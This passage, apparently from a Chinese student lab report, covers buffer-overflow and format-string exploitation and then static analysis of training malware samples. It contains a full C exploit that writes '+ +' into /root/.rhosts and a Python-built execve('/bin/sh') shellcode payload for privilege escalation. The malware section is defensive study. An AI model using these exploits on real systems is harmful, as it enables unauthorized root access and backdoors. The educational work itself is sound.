<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p> 下面的程序将用来攻击vulprog1.c.它传输参数给有弱点的程序。有弱点的程序以为将我们输入的一行数据储存到了一个临时文件里。然而，因为发生了静态缓冲区溢出的缘故，我们可以修改这个临时文件的指针，让它指向 <code>argv[1]</code> (我们将传递” <code>/root/.rhosts</code> “给它）。然后程序就会将我们提供的输入数据存在” <code>/root/.rhosts</code> “中。</p>
<p>我们用来覆盖缓冲区的字符串将会是下面的格式：<code>[+ + # ][(tmpfile地址) - (buf 地址)个字符&#39;A&#39;][argv[1]的地址]</code>，”<code>+ +</code>“后面跟着 ‘<code>#</code>‘ 号是为了防止我们的溢出代码出问题。没有 ‘<code>#</code>‘ (注释符)，使用<code>.rhosts</code>的程序就会错误解释我们的溢出代码。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFSIZE</span> <span class="token expression"><span class="token number">256</span></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DIFF</span> <span class="token expression"><span class="token number">16</span> </span><span class="token comment">/* vulprog中buf和tmpfile之间的间距 */</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">VULPROG</span> <span class="token string">"./vulprog1"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">VULFILE</span> <span class="token string">"/root/.rhosts"</span> <span class="token comment">/* buf 中的内容将被储存在这个文件中 */</span></span>

<span class="token comment">/* 得到当前堆栈的esp，用来计算argv[1]的地址 */</span>
u_long <span class="token function">getesp</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">__asm__</span><span class="token punctuation">(</span><span class="token string">"movl %esp,%eax"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    u_long addr<span class="token punctuation">;</span>

    <span class="token keyword">register</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token keyword">int</span> mainbufsize<span class="token punctuation">;</span>

    <span class="token keyword">char</span> <span class="token operator">*</span>mainbuf<span class="token punctuation">,</span> buf<span class="token punctuation">[</span>DIFF<span class="token operator">+</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"+ +\t# "</span><span class="token punctuation">;</span>

    <span class="token comment">/* ------------------------------------------------------ */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Usage: %s &lt;offset> [try 310-330]\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span>ERROR<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">/* ------------------------------------------------------ */</span>

    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"+ +\t# "</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/*
将攻击代码填入buf */</span>

    <span class="token function">memset</span><span class="token punctuation">(</span>buf <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'A'</span><span class="token punctuation">,</span> DIFF<span class="token punctuation">)</span><span class="token punctuation">;</span> 	 <span class="token comment">/* 用'A'填满剩余的buf空间 */</span>
    addr <span class="token operator">=</span> <span class="token function">getesp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">/* 计算argv[1]的地址 */</span>

    <span class="token comment">/* 将地址反序排列(在小endian系统中)后存入buf+DIFF处 */</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>u_long<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        buf<span class="token punctuation">[</span>DIFF <span class="token operator">+</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>u_long<span class="token punctuation">)</span>addr <span class="token operator">>></span> <span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">/* 计算mainbuf的长度 */</span>
    mainbufsize <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>VULPROG<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>VULFILE<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">;</span>

    mainbuf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>mainbufsize<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>mainbuf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>mainbuf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">snprintf</span><span class="token punctuation">(</span>mainbuf<span class="token punctuation">,</span> mainbufsize <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"echo '%s' | %s %s\n"</span><span class="token punctuation">,</span>
             buf<span class="token punctuation">,</span> VULPROG<span class="token punctuation">,</span> VULFILE<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Overflowing tmpaddr to point to %p, check %s after.\n\n"</span><span class="token punctuation">,</span>
           addr<span class="token punctuation">,</span> VULFILE<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">system</span><span class="token punctuation">(</span>mainbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>下面是运行结果：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108132033106.png" alt="image-20230108132033106"></p>
<p>我们看到现在<code>tmpfile</code>指向 <code>argv[0](&quot;./vulprog1&quot;)</code>。</p>
<p>我们增加10个字节( <code>argv[0]</code>的长度)：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108132215704.png" alt="image-20230108132215704"></p>
<p>我们已经成功的将”<code>+ +</code>“添加到了 <code>/root/.rhosts</code> 中。攻击程序覆盖了 <code>vulprog</code> 用来接受 <code>gets()</code> 输入的静态缓冲区，并将猜测的 <code>argv[1]</code> 的地址覆盖 <code>tmpfile</code> 。</p>
<p>我们可以在 <code>mainbuf</code> 中放置任意长度的 ‘<code>A</code>‘ 直到发现多少个 ‘<code>A</code>‘ 才能到达 <code>tmpfile</code> 的地址。通常这个偏移量在编译的时候会发生改变，但我们可以很容易的重新计算/猜测甚至”暴力”猜测这个偏移量。</p>
<h3 id="3-4-格式化串溢出"><a href="#3-4-格式化串溢出" class="headerlink" title="3.4 格式化串溢出"></a>3.4 格式化串溢出</h3><h4 id="3-4-1-构造具有格式化串溢出漏洞的程序"><a href="#3-4-1-构造具有格式化串溢出漏洞的程序" class="headerlink" title="3.4.1 构造具有格式化串溢出漏洞的程序"></a>3.4.1 构造具有格式化串溢出漏洞的程序</h4><p>我们可以利用格式化串溢出实现越界数据访问，进而执行任意地址读写。本实验的操作系统环境是 <code>Ubuntu 20.04</code>，以 <code>gdb-peda</code> 作为调试器。</p>
<p>以下代码存在格式化串溢出漏洞：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"test"</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s %d %d %d %x %x %x\n"</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//格式控制符与参数数量不等</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运用 <code>gcc -z execstack -Wformat=0 -g -fno-stack-protector -m32 -o pr pr.c</code> 命令进行编译，并执行，得到如下执行结果：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107232522020.png" alt="image-20230107232522020"></p>
<p> 我们可以利用 <code>%x</code> 可以一直读取栈内的内存数据，<code>%n</code> 的作用是把前面已经打印的长度写入某个内存地址。如以下实例：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span> </span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span> 
    <span class="token keyword">int</span> num<span class="token operator">=</span><span class="token number">66666666</span><span class="token punctuation">;</span> 
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Before: num = %d\n"</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d%n\n"</span><span class="token punctuation">,</span> num<span class="token punctuation">,</span> <span class="token operator">&amp;</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"After: num = %d\n"</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>执行结果如下：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107232816790.png" alt="image-20230107232816790"></p>
<h4 id="3-4-2-实施缓冲区溢出攻击"><a href="#3-4-2-实施缓冲区溢出攻击" class="headerlink" title="3.4.2 实施缓冲区溢出攻击"></a>3.4.2 实施缓冲区溢出攻击</h4><p>编写如下漏洞利用代码：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argv<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argc<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">short</span> <span class="token keyword">int</span> zero<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> <span class="token operator">*</span>plen<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span>argc<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s%hn/n"</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span>plen<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>zero<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们可以运用 <code>gdb</code> 进行调试：</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804846b &lt;+0&gt;:	lea    ecx,[esp+0x4]
   0x0804846f &lt;+4&gt;:	and    esp,0xfffffff0
   0x08048472 &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]
   0x08048475 &lt;+10&gt;:	push   ebp
   0x08048476 &lt;+11&gt;:	mov    ebp,esp
   0x08048478 &lt;+13&gt;:	push   ebx
   0x08048479 &lt;+14&gt;:	push   ecx
   0x0804847a &lt;+15&gt;:	sub    esp,0x110
   0x08048480 &lt;+21&gt;:	mov    ebx,ecx
   0x08048482 &lt;+23&gt;:	mov    WORD PTR [ebp-0xa],0x0    &#x2F;&#x2F;zero
   0x08048488 &lt;+29&gt;:	sub    esp,0xc
   0x0804848b &lt;+32&gt;:	push   0x4
   0x0804848d &lt;+34&gt;:	call   0x8048340 &lt;malloc@plt&gt;
   0x08048492 &lt;+39&gt;:	add    esp,0x10
   0x08048495 &lt;+42&gt;:	mov    DWORD PTR [ebp-0x10],eax   &#x2F;&#x2F;plen<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>本程序栈帧可示意如下：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107233302648.png" alt="image-20230107233302648" style="zoom:67%;" /></p>
<p>如果攻击者提供 <code>260 bytes</code> 长的参数，最后四个字节将覆盖指针<code>*plen</code>。当接下来执行 <code>printf()</code> 时，将会在<code>*plen</code>（这个值由攻击者控制）所指向的内存中写入一些字符。然而，由于 <code>format string</code> 中的 <code>h</code>，攻击者将只能写两个字节（<code>short write</code>—-由于 <code>h</code> 的转换）到这个内存地址。如果提供的参数大于 <code>260</code> 字节，那么将会覆盖 <code>zero</code>，这个例子的程序将进入死循环。</p>
<p>我们需要构造一个合适的 <code>argc[1]</code> 。针对 <code>zero</code> 的检查，如果为 <code>NULL</code> 字节，程序将正常退出（这样就执行了shellcode）(<code>while</code> 循环结束，绕过死循环)。由于 <code>zero</code> 是两个字节长，包含了两个 <code>NULL</code> 字节的较小的数是<code>0x10000</code>（<code>65536</code> 的 <code>16</code> 进制）。</p>
<p>所以，如果 <code>argc[1]</code> 是 <code>65536 bytes</code> 长，<code>*plen</code> 指向了 <code>zero</code> 的地址的话，死循环将被绕过。</p>
<p>我们编写以下 <code>shellcode</code>：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">r <span class="token variable"><span class="token variable">`</span>python3 -c <span class="token string">'print "\x8c\xcf\xfe\xff"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"A"*(256-25-4)+"\x8e\xd0\xfe\xff"+"\x8c\xcf\xfe\xff"*((0x10000-260)/4)'</span><span class="token variable">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>将 <code>shellcode</code> 作为程序的参数执行，可以成功提权：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108132320982.png" alt="image-20230108132320982"></p>
<p>至此，攻击成功。</p>
<h1 id="实验四-恶意样本的静态分析与动态分析"><a href="#实验四-恶意样本的静态分析与动态分析" class="headerlink" title="实验四 恶意样本的静态分析与动态分析"></a>实验四 恶意样本的静态分析与动态分析</h1><h2 id="一、实验要求-3"><a href="#一、实验要求-3" class="headerlink" title="一、实验要求"></a>一、实验要求</h2><p>完成恶意样本的静态分析与动态分析，具体要求如下：</p>
<p>1）选择合适的 <code>PE</code> 文件浏览、分析工具，静态分析工具，动态分析工具（可以参照课内教学常见的工具），常见分析工具集，学习工具的使用；</p>
<p>2）针对附件中<code>Lab1</code>、<code>3</code>、<code>5</code>内（分析得更多加分）的可执行文件（<code>EXE</code> 和 <code>DLL</code>），给出恶意代码分析，分析其恶意特性、恶意功能以及恶意行为。</p>
<p>要求熟练掌握分析工具集的功能和方法；针对恶意代码给出静态分析和动态分析，最好能使用反汇编工具针对程序做程序分片和污点传播分析；成实验报告，详尽描述分析过程、方法、工具，给出恶意代码的行为特征。</p>
<h2 id="二、Lab1-分析"><a href="#二、Lab1-分析" class="headerlink" title="二、Lab1 分析"></a>二、<code>Lab1</code> 分析</h2><h3 id="2-1-Lab1-01"><a href="#2-1-Lab1-01" class="headerlink" title="2.1 Lab1-01"></a>2.1 <code>Lab1-01</code></h3><h4 id="2-1-1-扫描实验文件"><a href="#2-1-1-扫描实验文件" class="headerlink" title="2.1.1 扫描实验文件"></a>2.1.1 扫描实验文件</h4><p>使用<a target="_blank" rel="noopener" href="https://www.virscan.org/">VirScan - 多引擎文件在线检测平台</a>扫描实验文件：</p>
<p>扫描 <code>dll</code> 文件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108135517480.png" alt="image-20230108135517480"></p>
<p>扫描 <code>exe</code> 文件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108135458825.png" alt="image-20230108135458825"> </p>
<p>从扫描结果来看，可以确认这两个文件是病毒文件。</p>
<h4 id="2-1-2-确认文件的编译时间"><a href="#2-1-2-确认文件的编译时间" class="headerlink" title="2.1.2 确认文件的编译时间"></a>2.1.2 确认文件的编译时间</h4><p>我们使用 <code>PETools</code> 工具进行分析。</p>
<p>在 <code>PE</code> 头的 <code>_IMAGE_FILE_HEADER</code> 结构体中，<code>TimeDateStamp</code> 这个字段记录了文件的创建时间。</p>
<p>我们点击文件头：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108141121415.png" alt="image-20230108141121415"></p>
<p>点击”Time/Date”：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108141100013.png" alt="image-20230108141100013"></p>
<p>查看 <code>Labe1-01.exe</code> 文件的创建时间是2010年12月19日。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108141315825.png" alt="image-20230108141315825"></p>
<p>同样的方式得到 <code>Labe1-01.dll</code> 文件的创建时间是2010年12月19日。</p>
<h4 id="2-1-3-检查文件是否被加壳"><a href="#2-1-3-检查文件是否被加壳" class="headerlink" title="2.1.3 检查文件是否被加壳"></a>2.1.3 检查文件是否被加壳</h4><p>我们使用 <code>PEiD</code> 软件进行检查。</p>
<p>(<code>Labe1-01.dll</code>)</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108141940095.png" alt="image-20230108141940095"></p>
<p>(<code>Labe1-01.exe</code>)</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108141900917.png" alt="image-20230108141900917"></p>
<p>可以看到该程序是用 <code>Microsoft Visual C++ 6.0</code> 编写的。</p>
<p>假设程序被加壳，<code>PEiDdSCAN</code> 要么显示壳的名称，要么显示”<code>nothing found</code>“，故本程序未加壳。</p>
<h4 id="2-1-4-查看导入函数"><a href="#2-1-4-查看导入函数" class="headerlink" title="2.1.4 查看导入函数"></a>2.1.4 查看导入函数</h4><p>我们使用 <code>PEiD</code> 软件查看导入函数。我们将 <code>Labe1-01.exe</code> 拖入，并查看子系统：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108142337753.png" alt="image-20230108142337753"></p>
<p>查看输入表：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108142554431.png" alt="image-20230108142554431"></p>
<p>可以看到，程序调用了 <code>FindNextFileA</code> 和 <code>FindFirstFileA</code> 这两个 <code>API</code> 函数，它们主要用于查找系统中的一些文件；<code>CopyFile</code> 用于复制文件，<code>CreateFile</code> 用于创建文件。病毒程序用 <code>Copyfile</code> 函数一般的目的是想把自己复制到一个隐藏的位置。</p>
<p>以同样的方法查看 <code>dll</code> 文件的输入表：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108142728551.png" alt="image-20230108142728551"></p>
<p>可以看到 <code>dll</code> 文件导入了 <code>WS2_32.dll</code> 链接库，<code>WS2_32.dll</code> 链接库经常被用来做一些联网的操作。所以，我们推测 <code>dll</code> 程序会用到联网功能。</p>
<h4 id="2-1-5-strings-查看可执行文件的可打印字符串"><a href="#2-1-5-strings-查看可执行文件的可打印字符串" class="headerlink" title="2.1.5 strings 查看可执行文件的可打印字符串"></a>2.1.5 <code>strings</code> 查看可执行文件的可打印字符串</h4><p> 将 <code>strings.exe</code> 与待测文件放在一个目录下，使用命令 <code>.\strings.exe Lab01-01.exe</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108144208443.png" alt="image-20230108144208443"></p>
<p>我们看到，程序存在一个路径 <code>C:\windows\system32\kernel32.dll</code>，在这里可以猜到程序是想把自身或其他文件复制到该目录。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108144413153.png" alt="image-20230108144413153"></p>
<p>对其文件进行分析，<code>kerne132.dll</code> 文件显然是想将自己冒充混淆为Windows的系统文件 <code>kernel32.dll</code>。因此 <code>kerne132.dll</code> 可以作为一个基于主机的迹象来发现恶意代码感染，并且是我们分析恶意代码所需要关注的一个线索。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108144926238.png" alt="image-20230108144926238"></p>
<p>同样的方法查看 <code>Lab01-01.dll</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108144617768.png" alt="image-20230108144617768"></p>
<p>在第二个文件中出现了一个网址，继续查看这一 <code>IP</code> 地址，其实可以大概猜到病毒制造者是想让我们访问这一地址。</p>
<p>在 <code>IP</code> 查询平台上进行查询，发现 <code>127.26.152.13</code> 是保留地址，说明是出于教学目的使用的保留地址。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108144754203.png" alt="image-20230108144754203"></p>
<p>基于以上分析，得到以下结论：<code>.dll</code> 文件可能是一个后门，<code>.exe</code> 文件是用来安装与运行 <code>DLL</code> 文件的。后门是恶意代码将自身安装到一台计算机来允许攻击者访问，后门程序通常让攻击者只需很少认证甚至无需认证，便可连接到远程计算机上，并可以在本地系统执行命令。</p>
<h3 id="2-2-Lab1-02"><a href="#2-2-Lab1-02" class="headerlink" title="2.2 Lab1-02"></a>2.2 <code>Lab1-02</code></h3><h4 id="2-2-1-扫描实验文件"><a href="#2-2-1-扫描实验文件" class="headerlink" title="2.2.1 扫描实验文件"></a>2.2.1 扫描实验文件</h4><p>使用<a target="_blank" rel="noopener" href="https://www.virscan.org/">VirScan - 多引擎文件在线检测平台</a>扫描实验文件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108145308205.png" alt="image-20230108145308205"></p>
<p>从扫描结果来看，可以确认该文件是病毒文件。</p>
<h4 id="2-2-2-确认文件的编译时间"><a href="#2-2-2-确认文件的编译时间" class="headerlink" title="2.2.2 确认文件的编译时间"></a>2.2.2 确认文件的编译时间</h4><p>我们使用 <code>PETools</code> 工具进行分析。</p>
<p>在 <code>PE</code> 头的 <code>_IMAGE_FILE_HEADER</code> 结构体中，<code>TimeDateStamp</code> 这个字段记录了文件的创建时间。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108151348326.png" alt="image-20230108151348326"></p>
<p>查看 <code>Labe1-02.exe</code> 文件的创建时间是2011年1月19日。</p>
<h4 id="2-2-3-检查文件是否被加壳"><a href="#2-2-3-检查文件是否被加壳" class="headerlink" title="2.2.3 检查文件是否被加壳"></a>2.2.3 检查文件是否被加壳</h4><p>我们使用 <code>PEiD</code> 软件进行检查。在普通扫描中没有发现加壳，我们进行核心扫描，发现存在 <code>UPX</code> 壳：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108145206873.png" alt="image-20230108145206873"></p>
<p>我们使用 <code>Kali</code> 自带的脱壳指令进行脱壳：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108145743162.png" alt="image-20230108145743162"></p>
<p>脱壳完成后，我们重新将该文件拖入 <code>PEiD</code> 软件中，可以看到该程序是用 <code>Microsoft Visual C++ 6.0</code> 编写的：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108145930176.png" alt="image-20230108145930176"></p>
<h4 id="2-2-4-查看导入函数"><a href="#2-2-4-查看导入函数" class="headerlink" title="2.2.4 查看导入函数"></a>2.2.4 查看导入函数</h4><p>我们使用 <code>PEiD</code> 软件查看导入函数。我们将 <code>Labe1-02.exe</code> 拖入，并查看导入表：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108150150802.png" alt="image-20230108150150802"></p>
<p>我们得到以上 <code>API</code> 的含义：</p>
<ul>
<li><code>StartServiceCtrlDispatcherA</code>：把程序主线程连接到服务控制管理程序。使得线程成为调用进程的服务控制调度程序进程</li>
<li><code>OpenSCManagerA</code>：建立一个到服务控制管理器的连接，并打开指定的数据库</li>
<li><code>CreateServiceA</code>：创建一个服务对象，并将其添加到指定的服务控制管理器数据库</li>
</ul>
<p>表明该程序完成的任务是：创建一个线程，创建新的服务并控制。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108150208215.png" alt="image-20230108150208215"></p>
